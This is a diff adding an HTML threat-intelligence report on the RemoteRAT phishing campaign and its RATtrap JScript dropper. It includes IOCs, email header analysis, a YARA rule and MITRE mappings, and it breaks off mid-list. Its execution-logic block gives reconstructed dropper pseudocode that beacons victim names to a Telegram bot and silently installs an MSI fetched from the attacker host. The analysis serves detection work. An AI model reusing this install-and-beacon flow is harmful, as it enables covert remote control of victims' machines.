@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="RemoteRAT Campaign -- RATtrap Dropper. First public observation. By Joseph Goydish II.">
+<meta name="author" content="Joseph Goydish II">
+<meta property="og:title" content="RemoteRAT -- RATtrap Dropper Threat Intelligence">
+<meta property="og:description" content="First-mover intel: RATtrap JScript dropper, Telegram C2, dual-RMM. Active infrastructure. SILENTCONNECT cluster.">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="RemoteRAT -- RATtrap Dropper">
+<title>RemoteRAT // RATtrap Dropper // REMOTERAT-2026-05</title>
+<link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&f[]=jet-brains-mono@400,700&display=swap" rel="stylesheet">
+<style>
+:root,[data-theme="dark"]{--bg:#0d0f11;--surface:#13161a;--surface2:#181c21;--surface3:#1e2329;--border:#252b33;--text:#e2e8f0;--muted:#8892a4;--faint:#4a5568;--primary:#22d3ee;--primary-glow:rgba(34,211,238,0.12);--red:#f87171;--orange:#fb923c;--yellow:#fbbf24;--green:#4ade80;--purple:#c084fc;--font-body:"Satoshi",system-ui,sans-serif;--font-mono:"JetBrains Mono","Courier New",monospace;--radius:6px;--radius-lg:10px;}
+[data-theme="light"]{--bg:#f1f5f9;--surface:#fff;--surface2:#f8fafc;--surface3:#e2e8f0;--border:#cbd5e1;--text:#0f172a;--muted:#475569;--faint:#94a3b8;--primary:#0284c7;--primary-glow:rgba(2,132,199,0.1);--red:#dc2626;--yellow:#d97706;--green:#16a34a;}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}html{scroll-behavior:smooth;font-size:14px}body{font-family:var(--font-body);background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;-webkit-font-smoothing:antialiased}a{color:var(--primary);text-decoration:none}a:hover{text-decoration:underline}code,pre{font-family:var(--font-mono)}
+.topbar{display:flex;align-items:center;justify-content:space-between;padding:12px 24px;background:var(--surface);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100;gap:16px;flex-wrap:wrap}
+.topbar-left{display:flex;align-items:center;gap:12px}
+.logo{display:flex;align-items:center;gap:8px;font-weight:700;font-size:15px;letter-spacing:-.3px}
+.badge{padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;letter-spacing:.5px;text-transform:uppercase}
+.badge-red{background:rgba(248,113,113,.15);color:var(--red);border:1px solid rgba(248,113,113,.3)}
+.badge-yellow{background:rgba(251,191,36,.15);color:var(--yellow);border:1px solid rgba(251,191,36,.3)}
+.badge-cyan{background:rgba(34,211,238,.12);color:var(--primary);border:1px solid rgba(34,211,238,.25)}
+.badge-green{background:rgba(74,222,128,.12);color:var(--green);border:1px solid rgba(74,222,128,.25)}
+.topbar-right{display:flex;align-items:center;gap:8px}
+.btn{padding:6px 14px;border-radius:var(--radius);font-size:12px;font-weight:600;cursor:pointer;border:1px solid var(--border);background:var(--surface2);color:var(--muted);transition:all 180ms ease}
+.btn:hover{border-color:var(--primary);color:var(--primary)}
+.theme-toggle{background:none;border:none;cursor:pointer;padding:6px;color:var(--muted);border-radius:var(--radius)}
+.theme-toggle:hover{color:var(--text)}
+.layout{display:flex;flex:1;min-height:0}
+.sidebar{width:240px;flex-shrink:0;background:var(--surface);border-right:1px solid var(--border);padding:20px 0;overflow-y:auto;position:sticky;top:49px;height:calc(100vh - 49px)}
+.main{flex:1;overflow:auto;padding:28px 32px;max-width:1100px}
+.nav-section{margin-bottom:20px}
+.nav-label{padding:4px 20px;font-size:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--faint)}
+.nav-item{display:block;padding:7px 20px;font-size:13px;color:var(--muted);cursor:pointer;transition:all 150ms}
+.nav-item:hover,.nav-item.active{color:var(--text);background:var(--primary-glow);border-left:2px solid var(--primary);padding-left:18px}
+.nav-item.active{color:var(--primary)}
+.section{display:none}.section.active{display:block}
+.page-header{margin-bottom:28px;padding-bottom:20px;border-bottom:1px solid var(--border)}
+.page-title{font-size:22px;font-weight:700;letter-spacing:-.5px;margin-bottom:4px}
+.page-meta{font-size:12px;color:var(--muted)}.page-meta span{margin-right:16px}
+.alert{padding:12px 16px;border-radius:var(--radius);margin-bottom:24px;display:flex;align-items:flex-start;gap:10px;font-size:13px;line-height:1.5}
+.alert-red{background:rgba(248,113,113,.08);border:1px solid rgba(248,113,113,.25)}.alert-red .alert-icon{color:var(--red);flex-shrink:0;margin-top:1px}
+.alert-yellow{background:rgba(251,191,36,.08);border:1px solid rgba(251,191,36,.25)}.alert-yellow .alert-icon{color:var(--yellow);flex-shrink:0;margin-top:1px}
+.stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;margin-bottom:24px}
+.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);padding:16px}
+.stat-label{font-size:11px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;color:var(--muted);margin-bottom:6px}
+.stat-value{font-size:20px;font-weight:700;font-variant-numeric:tabular-nums}
+.stat-sub{font-size:11px;color:var(--muted);margin-top:4px}
+.stat-red{color:var(--red)}.stat-yellow{color:var(--yellow)}.stat-green{color:var(--green)}.stat-cyan{color:var(--primary)}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);padding:20px;margin-bottom:16px}
+.card-title{font-size:13px;font-weight:700;letter-spacing:-.2px;margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.tbl-wrap{overflow-x:auto;margin-bottom:4px}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+thead th{padding:8px 12px;text-align:left;font-weight:600;font-size:11px;letter-spacing:.5px;text-transform:uppercase;color:var(--muted);background:var(--surface2);border-bottom:1px solid var(--border)}
+tbody td{padding:9px 12px;border-bottom:1px solid var(--border);color:var(--text);vertical-align:top}
+tbody tr:last-child td{border-bottom:none}
+tbody tr:hover td{background:var(--surface2)}
+.mono{font-family:var(--font-mono);font-size:11.5px}
+.conf{display:inline-block;padding:1px 7px;border-radius:3px;font-size:10px;font-weight:700;letter-spacing:.3px}
+.conf-high{background:rgba(248,113,113,.15);color:var(--red)}.conf-med{background:rgba(251,191,36,.12);color:var(--yellow)}
+.codeblock{background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:16px;overflow-x:auto;font-size:12px;line-height:1.7;margin-bottom:12px;white-space:pre}
+.codeblock .c{color:var(--faint)}.codeblock .k{color:var(--purple)}.codeblock .s{color:var(--green)}.codeblock .n{color:var(--primary)}.codeblock .ip{color:var(--orange)}
+.chain{display:flex;flex-direction:column;gap:0}
+.chain-step{display:flex;gap:16px;align-items:stretch}
+.chain-line{display:flex;flex-direction:column;align-items:center;width:32px;flex-shrink:0}
+.chain-dot{width:12px;height:12px;border-radius:50%;background:var(--primary);border:2px solid var(--bg);flex-shrink:0;margin-top:4px}
+.chain-dot.red{background:var(--red)}.chain-dot.yellow{background:var(--yellow)}.chain-dot.purple{background:var(--purple)}
+.chain-connector{flex:1;width:2px;background:var(--border);margin:2px 0}
+.chain-content{flex:1;padding-bottom:20px}
+.chain-title{font-size:13px;font-weight:700;margin-bottom:4px}
+.chain-sub{font-size:12px;color:var(--muted);line-height:1.6}
+.mitre-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
+.mitre-card{background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);padding:12px 14px}
+.mitre-id{font-family:var(--font-mono);font-size:11px;color:var(--primary);font-weight:700;margin-bottom:4px}
+.mitre-name{font-size:12.5px;font-weight:600;margin-bottom:3px}
+.mitre-desc{font-size:11.5px;color:var(--muted);line-height:1.5}
+.timeline{position:relative;padding-left:24px}
+.timeline::before{content:"";position:absolute;left:8px;top:0;bottom:0;width:2px;background:var(--border)}
+.tl-item{position:relative;margin-bottom:20px}
+.tl-dot{position:absolute;left:-20px;top:4px;width:10px;height:10px;border-radius:50%;background:var(--primary);border:2px solid var(--bg)}
+.tl-time{font-size:11px;color:var(--muted);font-family:var(--font-mono);margin-bottom:3px}
+.tl-text{font-size:13px;line-height:1.6}
+.text-red{color:var(--red)}.text-yellow{color:var(--yellow)}.text-green{color:var(--green)}.text-cyan{color:var(--primary)}.text-muted{color:var(--muted)}.text-mono{font-family:var(--font-mono);font-size:12px}
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.prose{font-size:13px;line-height:1.7;color:var(--muted);max-width:72ch}
+.prose strong{color:var(--text)}.prose p{margin-bottom:12px}
+.mt12{margin-top:12px}.mt16{margin-top:16px}.mb8{margin-bottom:8px}
+@media(max-width:768px){.sidebar{display:none}.main{padding:16px}.two-col{grid-template-columns:1fr}.stat-grid{grid-template-columns:1fr 1fr}}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <div class="topbar-left">
+    <div class="logo">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color:var(--primary)"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+      RemoteRAT
+    </div>
+    <span class="badge badge-red">LIVE C2</span>
+    <span class="badge badge-yellow">REMOTERAT-2026-05</span>
+    <span class="badge badge-cyan">RATtrap Dropper</span>
+  </div>
+  <div class="topbar-right">
+    <span style="font-size:11px;color:var(--muted);font-family:var(--font-mono)">2026-05-25T20:56:07Z</span>
+    <span class="badge badge-green">FIRST PUBLIC OBSERVATION</span>
+    <button class="theme-toggle" data-theme-toggle aria-label="Toggle theme">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+    </button>
+  </div>
+</header>
+<div class="layout">
+  <nav class="sidebar">
+    <div class="nav-section">
+      <div class="nav-label">Intelligence</div>
+      <a class="nav-item active" onclick="show('overview',this)">Overview</a>
+      <a class="nav-item" onclick="show('chain',this)">Attack Chain</a>
+      <a class="nav-item" onclick="show('dropper',this)">RATtrap Dropper</a>
+      <a class="nav-item" onclick="show('transport',this)">Transport / Headers</a>
+    </div>
+    <div class="nav-section">
+      <div class="nav-label">Detections</div>
+      <a class="nav-item" onclick="show('iocs',this)">IOC Master Table</a>
+      <a class="nav-item" onclick="show('yara',this)">YARA Rule</a>
+      <a class="nav-item" onclick="show('mitre',this)">MITRE ATT&amp;CK</a>
+    </div>
+    <div class="nav-section">
+      <div class="nav-label">Context</div>
+      <a class="nav-item" onclick="show('cluster',this)">SILENTCONNECT Cluster</a>
+      <a class="nav-item" onclick="show('infra',this)">Infrastructure</a>
+      <a class="nav-item" onclick="show('disclosure',this)">Disclosure</a>
+    </div>
+    <div style="padding:20px;border-top:1px solid var(--border);font-size:11px;color:var(--faint);line-height:1.6;margin-top:20px">
+      <div style="font-weight:700;color:var(--muted);margin-bottom:4px">RemoteRAT / RATtrap</div>
+      Case REMOTERAT-2026-05<br>Author: Joseph Goydish II<br>First Obs: 2026-05-25
+    </div>
+  </nav>
+  <main class="main">
+
+    <!-- OVERVIEW -->
+    <div id="overview" class="section active">
+      <div class="page-header">
+        <div class="page-title">RemoteRAT Campaign</div>
+        <div class="page-meta"><span>Case: REMOTERAT-2026-05</span><span>Dropper: RATtrap (JScript)</span><span>Author: Joseph Goydish II</span></div>
+      </div>
+      <div class="alert alert-red">
+        <svg class="alert-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <div><strong>Active infrastructure confirmed at time of publication.</strong> Telegram C2 bot <span class="text-mono">@Damisky001bot</span> and dropper host <span class="text-mono">dgs.brimis[.]org</span> both returned live responses. Zero prior coverage across all public threat feeds.</div>
+      </div>
+      <div class="stat-grid">
+        <div class="stat-card"><div class="stat-label">Infra Age</div><div class="stat-value stat-red">17 days</div><div class="stat-sub">brimis.org registered 2026-05-08</div></div>
+        <div class="stat-card"><div class="stat-label">MSI Payload</div><div class="stat-value stat-red">LIVE</div><div class="stat-sub">HTTP 200 / 11.6 MB at discovery</div></div>
+        <div class="stat-card"><div class="stat-label">Telegram C2</div><div class="stat-value stat-red">LIVE</div><div class="stat-sub">getMe returned HTTP 200</div></div>
+        <div class="stat-card"><div class="stat-label">RMM Channels</div><div class="stat-value stat-yellow">2</div><div class="stat-sub">ScreenConnect + LogMeIn Resolve</div></div>
+        <div class="stat-card"><div class="stat-label">Feed Coverage</div><div class="stat-value stat-green">0</div><div class="stat-sub">GreyNoise / OTX / URLScan / Shodan</div></div>
+        <div class="stat-card"><div class="stat-label">Cluster Nodes</div><div class="stat-value stat-cyan">4</div><div class="stat-sub">SILENTCONNECT-compatible</div></div>
+      </div>
+      <div class="two-col">
+        <div class="card"><div class="card-title">Campaign Profile</div>
+          <table><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Campaign</td><td class="mono">RemoteRAT</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Dropper</td><td class="mono">RATtrap (JScript)</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Case ID</td><td class="mono">REMOTERAT-2026-05</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Actor</td><td class="mono">Damisky / Misky</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Cluster</td><td class="mono">SILENTCONNECT</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Author</td><td class="mono">Joseph Goydish II</td></tr></table>
+        </div>
+        <div class="card"><div class="card-title">Delivery Profile</div>
+          <table><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Lure</td><td class="mono">Business Meeting Invitation</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">SPF</td><td><span class="badge badge-red">PASS</span></td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">DKIM</td><td><span class="badge badge-red">PASS</span></td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">DMARC</td><td><span class="badge badge-red">PASS</span></td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Origin ASN</td><td class="mono">AS931 Hyonix LLC</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Origin IP</td><td class="mono">207[.]189[.]26[.]195</td></tr></table>
+        </div>
+      </div>
+      <div class="card mt12"><div class="card-title">What RemoteRAT Does</div>
+        <div class="prose">
+          <p>A business-invitation email passes every authentication check and lands in the victim inbox. When the victim clicks, the <strong>RATtrap</strong> JScript dropper executes via Windows Script Host. Within seconds, a Telegram bot controlled by the attacker receives the victim machine name and username.</p>
+          <p>RATtrap then installs ScreenConnect and registers the device under the attacker's remote management console. If ScreenConnect is removed, LogMeIn Resolve is already running as a second persistent channel. Both are legitimate signed applications — antivirus does not flag either one.</p>
+          <p>The attacker can see the screen, control the mouse and keyboard, transfer files, and reconnect at any time. ScreenConnect has iOS and Android clients, giving an operator a potential bridge from the Windows foothold to mobile devices on the same network. This technique is documented as <strong>T1219 (Remote Access Software)</strong> in MITRE ATT&CK.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ATTACK CHAIN -->
+    <div id="chain" class="section">
+      <div class="page-header"><div class="page-title">Attack Chain</div><div class="page-meta"><span>Five-stage kill chain — email to dual-RMM persistence</span></div></div>
+      <div class="chain">
+        <div class="chain-step"><div class="chain-line"><div class="chain-dot yellow"></div><div class="chain-connector"></div></div><div class="chain-content"><div class="chain-title">Stage 1 - Infrastructure Prep</div><div class="chain-sub">Hyonix VPS <span class="text-mono">HY-52556 / 207[.]189[.]26[.]195</span> (AS931) provisioned as SMTP client. Domain <span class="text-mono">brimis.org</span> registered 17 days prior via Namecheap. Let's Encrypt cert issued same day. Cloudflare fronting applied. ScreenConnect server stood up at <span class="text-mono">dgs.brimis[.]org</span> with operator group <span class="text-mono">c=Misky</span>.</div></div></div>
+        <div class="chain-step"><div class="chain-line"><div class="chain-dot yellow"></div><div class="chain-connector"></div></div><div class="chain-content"><div class="chain-title">Stage 2 - Email Delivery</div><div class="chain-sub">Email sent from <span class="text-mono">cigardah287[@]gmail[.]com</span> (Growth Strategies LLC) via ESMTPSA from Hyonix VPS. <span class="badge badge-green conf">SPF PASS</span><span class="badge badge-green conf"> DKIM PASS</span><span class="badge badge-green conf"> DMARC PASS</span><br>Delivered to victim inbox. No spam flags. Subject: "Business Meeting Invitation".</div></div></div>
+        <div class="chain-step"><div class="chain-line"><div class="chain-dot red"></div><div class="chain-connector"></div></div><div class="chain-content"><div class="chain-title">Stage 3 - RATtrap Execution</div><div class="chain-sub">Victim clicks link. <span class="text-mono">invite.php</span> issues HTTP 302 to Dropbox-hosted <span class="text-mono">Business-Invitation.js</span>. Served with spoofed <span class="text-mono">Content-Type: application/json</span>. Windows Script Host executes RATtrap. Custom base64 rotation cipher decodes 85+ strings at runtime.</div></div></div>
+        <div class="chain-step"><div class="chain-line"><div class="chain-dot red"></div><div class="chain-connector"></div></div><div class="chain-content"><div class="chain-title">Stage 4 - Telegram C2 Beacon</div><div class="chain-sub">Before any file is written to disk, RATtrap sends victim <span class="text-mono">ComputerName</span> and <span class="text-mono">UserName</span> to <span class="text-mono">@Damisky001bot</span> (ID: 8970330885, Chat: 6687082236). Message: <span class="text-mono">"Inatllation started"</span> (actor typo fingerprint). C2 confirmed HTTP 200 at observation.</div></div></div>
+        <div class="chain-step"><div class="chain-line"><div class="chain-dot purple"></div><div class="chain-connector"></div></div><div class="chain-content"><div class="chain-title">Stage 5 - Dual-RMM Persistence</div><div class="chain-sub">ScreenConnect MSI (<span class="text-mono">bremis.ClientSetup.msi</span>, 11.6 MB) downloaded from <span class="text-mono">dgs.brimis[.]org</span>, installed silently. Device registered as <span class="text-mono">c=Misky</span>. LogMeIn Resolve deployed as secondary channel. Both persist as Windows services across reboots. Telegram beacon: <span class="text-mono">"Inatllation complete"</span>.</div></div></div>
+      </div>
+    </div>
+
+    <!-- RATTRAP -->
+    <div id="dropper" class="section">
+      <div class="page-header"><div class="page-title">RATtrap Dropper</div><div class="page-meta"><span>JScript dropper - custom cipher, Telegram beacon, dual-RMM installer</span></div></div>
+      <div class="two-col">
+        <div class="card"><div class="card-title">Properties</div><table><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Filename</td><td class="mono">Business-Invitation.js</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Type</td><td class="mono">JScript (WSH)</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Served As</td><td class="mono">application/json</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Delivery</td><td class="mono">Dropbox (dl=1)</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Cipher</td><td class="mono">Custom base64 rotation</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Decoded Strings</td><td class="mono">85+</td></tr></table></div>
+        <div class="card"><div class="card-title">Actor Fingerprint</div><div class="prose"><p>The string <strong>Inatllation</strong> (misspelled) appears twice in the decoded payload. Same misspelling in both Telegram beacons — the start and completion messages. Consistent, not corrected. Suggests a template-embedded string rather than two separate instances typed by hand.</p><p>Stable low-noise indicator for retrohunting on VirusTotal, YARA, and threat intel platforms.</p></div></div>
+      </div>
+      <div class="card"><div class="card-title">Execution Logic</div>
+<div class="codeblock"><span class="c">// RATtrap execution flow (reconstructed)</span>
+
+<span class="k">function</span> <span class="n">decode</span>(s) { <span class="c">/* custom base64 rotation cipher */</span> }
+
+<span class="c">// Phase 1: beacon before any disk write</span>
+victim = decode(env["COMPUTERNAME"]) + " | " + decode(env["USERNAME"])
+telegram_send(<span class="s">"8970330885"</span>, <span class="s">"6687082236"</span>, victim + <span class="s">" | Inatllation started"</span>)
+
+<span class="c">// Phase 2: primary RMM</span>
+msi = <span class="ip">"hxxps://dgs.brimis[.]org/Bin/bremis.ClientSetup.msi?e=Access&y=Guest&c=Misky"</span>
+download(msi, <span class="s">"C:\Temp\bremis.ClientSetup.msi"</span>)
+exec(<span class="s">"msiexec /i C:\Temp\bremis.ClientSetup.msi /qn /norestart"</span>)
+
+<span class="c">// Phase 3: secondary RMM</span>
+remove_existing_logmein()
+download(logmein_url, <span class="s">"C:\Temp\logmein.msi"</span>)
+exec(<span class="s">"msiexec /i C:\Temp\logmein.msi /qn /norestart"</span>)
+
+<span class="c">// Phase 4: completion beacon</span>
+telegram_send(<span class="s">"8970330885"</span>, <span class="s">"6687082236"</span>, victim + <span class="s">" | Inatllation complete"</span>)</div>
+      </div>
+    </div>
+
+    <!-- TRANSPORT -->
+    <div id="transport" class="section">
+      <div class="page-header"><div class="page-title">Transport Analysis</div><div class="page-meta"><span>SMTP header chain - annotated</span></div></div>
+      <div class="alert alert-yellow"><svg class="alert-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg><div>All authentication checks pass. This email would be classified as legitimate by every standard email filter. The attack relies on trusted infrastructure, not spoofing.</div></div>
+      <div class="card"><div class="card-title">Hop Chain</div>
+        <div class="timeline">
+          <div class="tl-item"><div class="tl-dot"></div><div class="tl-time">2026-05-25 13:56:05 PDT</div><div class="tl-text"><strong>Hop 1 - Origin</strong><br><span class="text-mono">HY-52556 (207[.]189[.]26[.]195)</span> connects to smtp.gmail.com via ESMTPSA. Session: <span class="text-mono">46e09a7af769-7e60648257csm7912345a34</span>. TLS: ECDHE-ECDSA-AES128-GCM-SHA256.</div></div>
+          <div class="tl-item"><div class="tl-dot"></div><div class="tl-time">2026-05-25 13:56:06 PDT</div><div class="tl-text"><strong>Hop 2 - Gmail routing</strong><br>Message-ID: <span class="text-mono">6a14b765.dbd6c068.4730f.84a6@mx.google.com</span>. DKIM signed d=gmail.com / b=PteO1gbs... (2048-bit).</div></div>
+          <div class="tl-item"><div class="tl-dot"></div><div class="tl-time">2026-05-25 20:56:07 UTC</div><div class="tl-text"><strong>Hop 3 - Delivery</strong><br>Received at mail.protonmail.ch via ESMTPS TLS 1.3. SPF PASS / DKIM PASS / DMARC PASS. Spam score: 0. Delivered to victim inbox.</div></div>
+        </div>
+      </div>
+      <div class="card mt12"><div class="card-title">Key Header Indicators</div>
+        <div class="tbl-wrap"><table><thead><tr><th>Field</th><th>Value</th><th>Significance</th></tr></thead><tbody>
+          <tr><td class="mono">Return-Path</td><td class="mono">cigardah287[@]gmail[.]com</td><td>Attacker Gmail account</td></tr>
+          <tr><td class="mono">Origin IP</td><td class="mono">207[.]189[.]26[.]195</td><td>Hyonix HY-52556</td></tr>
+          <tr><td class="mono">SMTP Session</td><td class="mono">46e09a7af769-7e60648257csm7912345a34</td><td>Google abuse report pivot</td></tr>
+          <tr><td class="mono">Message-ID</td><td class="mono">6a14b765.dbd6c068.4730f.84a6@mx.google.com</td><td>Unique message identifier</td></tr>
+          <tr><td class="mono">DKIM</td><td class="mono">b=PteO1gbs...</td><td>Signature fragment</td></tr>
+        </tbody></table></div>
+      </div>
+    </div>
+
+    <!-- IOCs -->
+    <div id="iocs" class="section">
+      <div class="page-header"><div class="page-title">IOC Master Table</div><div class="page-meta"><span>All indicators defanged. Remove brackets before operational use.</span></div></div>
+      <div class="card"><div class="card-title">Network - HIGH</div><div class="tbl-wrap"><table><thead><tr><th>Type</th><th>Indicator</th><th>Context</th><th>Conf</th></tr></thead><tbody>
+        <tr><td>IPv4</td><td class="mono">207[.]189[.]26[.]195</td><td>Hyonix HY-52556, SMTP origin</td><td><span class="conf conf-high">HIGH</span></td></tr>
+        <tr><td>Domain</td><td class="mono">dgs.brimis[.]org</td><td>ScreenConnect dropper host</td><td><span class="conf conf-high">HIGH</span></td></tr>
+        <tr><td>Domain</td><td class="mono">brimis[.]org</td><td>Parent domain, 2026-05-08</td><td><span class="conf conf-high">HIGH</span></td></tr>
+      </tbody></table></div></div>
+      <div class="card mt12"><div class="card-title">Email - HIGH</div><div class="tbl-wrap"><table><thead><tr><th>Type</th><th>Indicator</th><th>Conf</th></tr></thead><tbody>
+        <tr><td>Sender</td><td class="mono">cigardah287[@]gmail[.]com</td><td><span class="conf conf-high">HIGH</span></td></tr>
+        <tr><td>Message-ID</td><td class="mono">6a14b765.dbd6c068.4730f.84a6@mx.google.com</td><td><span class="conf conf-high">HIGH</span></td></tr>
+        <tr><td>SMTP Session</td><td class="mono">46e09a7af769-7e60648257csm7912345a34</td><td><span class="conf conf-high">HIGH</span></td></tr>
+        <tr><td>DKIM Fragment</td><td class="mono">b=PteO1gbs</td><td><span class="conf conf-high">HIGH</span></td></tr>
+      </tbody></table></div></div>
+      <div class="card mt12"><div class="card-title">Files and Strings - HIGH</div><div class="tbl-wrap"><table><thead><tr><th>Type</th><th>Indicator</th><th>Context</th><th>Conf</th></tr></thead><tbody>
+        <tr><td>Filename</td><td class="mono">Business-Invitation.js</td><td>RATtrap dropper</td><td><span class="conf conf-high">HIGH</span></td></tr>
+        <tr><td>Filename</td><td class="mono">bremis.ClientSetup.msi</td><td>ScreenConnect MSI</td><td><span class="conf conf-high">HIGH</span></td></tr>
+        <tr><td>String</td><td class="mono">Inatllation</td><td>Actor typo (x2)</td><td><span class="conf conf-high">HIGH</span></td></tr>
+        <tr><td>URL Param</td><td class="mono">c=Misky</td><td>SC operator group</td><td><span class="conf conf-high">HIGH</span></td></tr>
+      </tbody></table></div></div>
+      <div class="card mt12"><div class="card-title">C2</div><div class="tbl-wrap"><table><thead><tr><th>Type</th><th>Indicator</th><th>Context</th><th>Conf</th></tr></thead><tbody>
+        <tr><td>Telegram Bot</td><td class="mono">@Damisky001bot (8970330885)</td><td>Victim telemetry - confirmed live</td><td><span class="conf conf-high">HIGH</span></td></tr>
+        <tr><td>Telegram Chat</td><td class="mono">6687082236</td><td>Operator receive channel</td><td><span class="conf conf-high">HIGH</span></td></tr>
+      </tbody></table></div></div>
+      <div class="card mt12"><div class="card-title">Cluster Nodes - MEDIUM</div><div class="tbl-wrap"><table><thead><tr><th>Domain</th><th>IP</th><th>ASN</th><th>Conf</th></tr></thead><tbody>
+        <tr><td class="mono">tigecarllc[.]de</td><td class="mono">Cloudflare</td><td>CF</td><td><span class="conf conf-med">MED</span></td></tr>
+        <tr><td class="mono">newoneazu[.]com</td><td class="mono">45[.]81[.]23[.]155</td><td>Alsycon NL</td><td><span class="conf conf-med">MED</span></td></tr>
+        <tr><td class="mono">bumptobabeco[.]top</td><td class="mono">86[.]38[.]225[.]59</td><td>Majestic Hosting VA</td><td><span class="conf conf-med">MED</span></td></tr>
+      </tbody></table></div></div>
+    </div>
+
+    <!-- YARA -->
+    <div id="yara" class="section">
+      <div class="page-header"><div class="page-title">YARA Rule</div><div class="page-meta"><span>rattrap_jscript_dropper.yar</span></div></div>
+      <div class="card"><div class="card-title">RATtrap_JScript_Dropper_2026</div>
+<div class="codeblock"><span class="k">rule</span> <span class="n">RATtrap_JScript_Dropper_2026</span> {
+    <span class="k">meta:</span>
+        description = <span class="s">"RATtrap (RemoteRAT) JScript dropper - typo fingerprint + C2 strings"</span>
+        author      = <span class="s">"Joseph Goydish II"</span>
+        date        = <span class="s">"2026-05-25"</span>
+        reference   = <span class="s">"REMOTERAT-2026-05"</span>
+        mitre       = <span class="s">"T1059.007, T1219, T1071.001"</span>
+    <span class="k">strings:</span>
+        $typo  = <span class="s">"Inatllation"</span> ascii wide nocase
+        $bot   = <span class="s">"Damisky001bot"</span> ascii wide
+        $group = <span class="s">"c=Misky"</span> ascii wide
+        $msi   = <span class="s">"bremis.ClientSetup.msi"</span> ascii wide
+        $host  = <span class="s">"dgs.brimis.org"</span> ascii wide
+    <span class="k">condition:</span>
+        $typo
+        or ($bot and $group)
+        or ($msi and $group)
+        or (2 of ($host, $msi, $bot))
+}</div>
+        <div class="prose mt12"><p>The <strong>$typo</strong> condition is the highest-fidelity single-string match. Two occurrences of the same misspelling in the same payload is a reliable actor-consistent fingerprint with minimal false-positive risk. Compound conditions catch variants where the typo has been corrected but infrastructure strings remain.</p></div>
+      </div>
+    </div>
+
+    <!-- MITRE -->
+    <div id="mitre" class="section">
+      <div class="page-header"><div class="page-title">MITRE ATT&amp;CK</div><div class="page-meta"><span>RemoteRAT / RATtrap - REMOTERAT-2026-05</span></div></div>
+      <div class="mitre-grid">
+        <div class="mitre-card"><div class="mitre-id">T1566.002</div><div class="mitre-name">Spearphishing Link</div><div class="mitre-desc">Business Meeting Invitation lure via authenticated Gmail</div></div>
+        <div class="mitre-card"><div class="mitre-id">T1078</div><div class="mitre-name">Valid Accounts</div><div class="mitre-desc">Legitimate Gmail - full SPF/DKIM/DMARC pass</div></div>
+        <div class="mitre-card"><div class="mitre-id">T1583.003</div><div class="mitre-name">Acquire: VPS</div><div class="mitre-desc">Hyonix HY-52556 as SMTP submission client</div></div>
+        <div class="mitre-card"><div class="mitre-id">T1583.001</div><div class="mitre-name">Acquire: Domains</div><div class="mitre-desc">brimis.org - 17 days old at attack</div></div>
+        <div class="mitre-card"><div class="mitre-id">T1204.002</div><div class="mitre-name">User Execution: File</div><div class="mitre-desc">Business-Invitation.js opened by victim</div></div>
+        <div class="mitre-card"><div class="mitre-id">T1059.007</div><div class="mitre-name">JavaScript/JScript</div><div class="mitre-desc">RATtrap runs via Windows Script Host</div></div>
